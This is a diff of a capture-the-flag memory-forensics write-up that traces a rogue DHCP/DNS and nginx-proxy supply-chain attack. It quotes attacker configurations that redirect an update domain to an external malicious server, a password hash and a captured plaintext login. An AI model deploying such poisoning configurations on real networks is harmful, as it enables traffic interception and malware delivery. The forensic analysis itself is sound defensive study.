@@ -112,11 +112,15 @@ Before diving into specific questions, I established a methodology combining Vol
 
 **Why This Hybrid Approach?**
 
-Memory forensics often requires multiple techniques because:
-- Volatility plugins provide structured data (processes, bash history)
-- String extraction reveals evidence that may not be in active process memory
-- Symbol issues can limit plugin effectiveness
-- Combined analysis provides redundancy and validation
+Memory forensics professionals routinely combine techniques:
+
+- **Structured Analysis (Volatility):** Parses known memory structures like 
+  process lists and network connections
+- **Unstructured Analysis (Strings):** Captures data outside active processes - 
+  cached files, configuration fragments, deleted content
+- **Page Cache Analysis:** Recovers file metadata even when files aren't actively 
+  in use
+- **Cross-Validation:** Multiple sources confirm findings and fill gaps
 
 ### Question 1: Linux Kernel Version
 
@@ -228,6 +232,15 @@ This is a shadow file entry showing:
 - Hash: `$1$jm$poAH2RyJp8ZllyUvIkxxd0`
 - Hash type: `$1$` = MD5-crypt
 - Salt: `jm`
+
+**How Shadow Files End Up in Memory:**
+
+The `/etc/shadow` file contents appeared in the memory dump because system 
+processes cached this data during authentication operations. When the attacker 
+used `su jm` to switch users, the system read the shadow file to verify the 
+password, temporarily storing it in memory. Memory dumps capture these transient 
+reads, which is why sensitive data like password hashes can be recovered even 
+though they're normally protected on disk.
 
 **Cracking the Hash with John the Ripper:**
 
@@ -451,7 +464,23 @@ From the bash history, I identified the package installation:
 22714   bash    2025-09-03 08:21:30.000000 UTC  systemctl restart dnsmasq
 ```
 
-The package is **dnsmasq** (a lightweight DNS and DHCP server). To find the PID, I used `linux.pslist`:
+The package is **dnsmasq** (a lightweight DNS and DHCP server).
+
+**Understanding the Network Takeover:**
+
+The iptables commands transformed the compromised system into a malicious router:
+
+1. **Traffic Forwarding:** Routes packets between ens224 (internal network) and 
+   ens192 (external network)
+2. **NAT Configuration:** Masquerades traffic from 192.168.211.0/24, making the 
+   attacker's machine the gateway
+3. **DNS/DHCP Poisoning:** dnsmasq distributes malicious network configs to 
+   victims and redirects DNS queries
+
+This creates a man-in-the-middle position where all traffic from the subnet 
+passes through the attacker's machine.
+
+To find the PID, I used `linux.pslist`:
 
 ```cmd
 (venv) C:\volatility3>python vol.py -f C:\Users\Utilisateur\Desktop\The_Tunnel_Without_Walls\memdump.mem linux.pslist
@@ -486,8 +515,9 @@ This setup allows the attacker to perform man-in-the-middle attacks by:
 
 **Solution:**
 
-Searching for "CogWork-1" in `strings.txt` (referenced in the question), I found the dnsmasq configuration:
+I searched strings.txt for "CogWork-1" (mentioned in the question context) using Notepad++'s search feature. This revealed multiple evidence fragments scattered throughout the memory dump at different locations. These weren't consecutive blocks - they appeared separately among unrelated memory contents, representing different data structures from various memory regions.
 
+**Evidence Fragment 1 - dnsmasq Configuration:**
 ```
 interface=ens224
 dhcp-range=192.168.211.30,192.168.211.240,1h
@@ -503,25 +533,53 @@ quiet-dhcp6
 log-facility=/dev/null
 ```
 
-Further down, I found DHCP lease information:
-
+**Evidence Fragment 2 - DHCP Lease Information:**
 ```
 1756891471 00:50:56:b4:32:cd 192.168.211.52 Parallax-5-WS-3 01:00:50:56:b4:32:cd
 ```
 
-This shows:
+This DHCP lease entry reveals:
 - **Hostname:** Parallax-5-WS-3
 - **IP Address:** 192.168.211.52
 - **MAC Address:** 00:50:56:b4:32:cd
-- **Lease timestamp:** 1756891471
+- **Lease Timestamp:** 1756891471 (Unix epoch)
 
-**What Happened:**
+**Evidence Fragment 3 - Nginx Reverse Proxy Configuration:**
+```
+server {
+    listen 80;
+    location / {
+        proxy_pass http://13.62.49.86:7477/;
+        proxy_set_header Host jm_supply;
+    }
+}
+```
+
+**Evidence Fragment 4 - Malicious Update Request:**
+```
+GET /win10/update/CogSoftware/AetherDesk-v74-77.exe HTTP/1.1
+Host: updates.cogwork-1.net
+Accept: */*
+User-Agent: AetherDesk/73.0 (Windows NT 10.0; Win64; x64)
+```
+
+**Attack Flow Analysis:**
 
 The attacker configured dnsmasq to:
-- Serve as DHCP server for the 192.168.211.0/24 network
-- Set itself (192.168.211.8) as the default gateway and DNS server
-- Redirect `updates.cogwork-1.net` to the malicious server
-- The workstation "Parallax-5-WS-3" received this poisoned configuration
+1. Act as a rogue DHCP server for the 192.168.211.0/24 network
+2. Distribute network configurations pointing to itself (192.168.211.8) as both the default gateway and DNS server
+3. Redirect DNS queries for `updates.cogwork-1.net` to the attacker-controlled IP
+4. The workstation "Parallax-5-WS-3" received and applied this poisoned configuration
+
+**Why Evidence is Scattered:**
+
+These fragments appearing in different memory locations is normal and expected. They represent distinct data structures:
+- Configuration files cached in memory
+- Active DHCP lease databases
+- HTTP request buffers
+- Container configuration data
+
+Each existed in separate memory regions based on which process or kernel structure owned them.
 
 **Flag:** `Parallax-5-WS-3`
 
@@ -533,7 +591,9 @@ The attacker configured dnsmasq to:
 
 **Solution:**
 
-Searching for "POST /" in `strings.txt` to find authentication requests:
+Having found evidence of HTTP traffic in the CogWork-1 search (Fragment 4 above), I searched strings.txt for "POST /" to locate authentication requests containing credentials. Notepad++'s search made examining POST requests quick and efficient.
+
+I found this HTTP POST request:
 
 ```
 POST /index.php HTTP/1.1
@@ -556,12 +616,17 @@ username=mike.sullivan&password=Pizzaaa1%21
 
 **Analysis:**
 
-The POST request reveals:
+The POST request body reveals:
 - **Username:** mike.sullivan
 - **Password:** Pizzaaa1! (URL-decoded from `Pizzaaa1%21`)
-- **Target:** Internal portal at 10.129.232.25:8081
+- **Target Server:** Internal portal at 10.129.232.25:8081
+- **Session Cookie:** PHPSESSID indicates PHP-based application
 
-This traffic was captured because the malicious DNS server redirected the user through the attacker's infrastructure, allowing packet capture.
+**Why This Traffic Was Captured:**
+
+The malicious DNS/DHCP configuration forced the workstation's traffic through the attacker's infrastructure. Even though the user believed they were accessing an internal portal, the attacker's position as the default gateway allowed them to capture and log all HTTP traffic, including authentication requests.
+
+This demonstrates the impact of the network poisoning attack from Q7 - the attacker gained visibility into all network communications from compromised workstations.
 
 **Flag:** `mike.sullivan`
 
@@ -573,7 +638,7 @@ This traffic was captured because the malicious DNS server redirected the user t
 
 **Solution:**
 
-From the same section in `strings.txt`, I found the malicious update request:
+The malicious update endpoint was already visible in Evidence Fragment 4 from the CogWork-1 search (Question 7):
 
 ```
 GET /win10/update/CogSoftware/AetherDesk-v74-77.exe HTTP/1.1
@@ -584,10 +649,16 @@ User-Agent: AetherDesk/73.0 (Windows NT 10.0; Win64; x64)
 
 **Supply Chain Attack Flow:**
 
-1. User trusts the internal portal recommendation
-2. Attempts to download update from `updates.cogwork-1.net`
-3. Malicious DNS server redirects to attacker's infrastructure
-4. User downloads trojanized software thinking it's legitimate
+1. User authenticates to internal portal (Q8)
+2. Portal recommends updating AetherDesk software to "latest version"
+3. User trusts the recommendation and initiates download
+4. DNS query for `updates.cogwork-1.net` is intercepted by malicious dnsmasq server
+5. User is redirected to attacker-controlled infrastructure
+6. Trojanized software (`AetherDesk-v74-77.exe`) is downloaded instead of legitimate update
+
+**Attack Sophistication:**
+
+The User-Agent header (`AetherDesk/73.0`) indicates the legitimate software version was 73.0, and the attacker crafted a convincing "update" to versions 74-77. This level of detail suggests reconnaissance of the target environment to create believable malicious updates.
 
 **Flag:** `/win10/update/CogSoftware/AetherDesk-v74-77.exe`
 
@@ -599,14 +670,14 @@ User-Agent: AetherDesk/73.0 (Windows NT 10.0; Win64; x64)
 
 **Solution:**
 
-From the dnsmasq configuration found earlier:
+Combining evidence from the CogWork-1 search fragments, I mapped the complete redirection chain:
 
+**From Evidence Fragment 1 (dnsmasq config):**
 ```
 address=/updates.cogwork-1.net/192.168.211.8
 ```
 
-And the nginx reverse proxy configuration:
-
+**From Evidence Fragment 3 (nginx reverse proxy):**
 ```
 server {
     listen 80;
@@ -617,16 +688,36 @@ server {
 }
 ```
 
-**Attack Infrastructure:**
+**Complete Attack Infrastructure:**
 
-1. **Original domain:** updates.cogwork-1.net (legitimate update server)
-2. **DNS poisoning:** Points to 192.168.211.8 (attacker's machine)
-3. **Reverse proxy:** Forwards to 13.62.49.86:7477 (actual malicious server)
+```
+User Request for updates.cogwork-1.net
+         ↓
+DNS Query intercepted by malicious dnsmasq
+         ↓
+Resolves to 192.168.211.8 (attacker's machine)
+         ↓
+nginx reverse proxy on port 80
+         ↓
+Forwards to http://13.62.49.86:7477/ (actual malicious server)
+```
 
-The attacker created a sophisticated man-in-the-middle infrastructure:
-- DNS server redirects victims to the compromised Linux machine
-- Nginx proxy forwards requests to the actual malicious server
-- Maintains stealth by using a proxy chain
+**Architecture Analysis:**
+
+1. **Original Domain:** `updates.cogwork-1.net` (legitimate update server)
+2. **DNS Poisoning:** Points to 192.168.211.8 (compromised Linux machine)
+3. **Reverse Proxy Layer:** nginx forwards requests to the real malicious infrastructure
+4. **Final Destination:** 13.62.49.86:7477 (attacker's command and control server)
+
+**Why Use a Proxy Chain:**
+
+The attacker employed a multi-layered approach for:
+- **Stealth:** Direct connections to 13.62.49.86 would be suspicious; routing through the compromised internal machine appears normal
+- **Flexibility:** Can redirect to different backends without changing DNS configuration
+- **Resilience:** If the final server goes down, the proxy can be reconfigured without alerting victims
+- **Attribution Evasion:** Investigators see connections to an internal IP, not the external C2 server
+
+The `proxy_set_header Host jm_supply` line also suggests the backend server uses virtual hosting, with "jm_supply" identifying the malicious supply chain component.
 
 **Flag:** `updates.cogwork-1.net,13.62.49.86:7477`
 
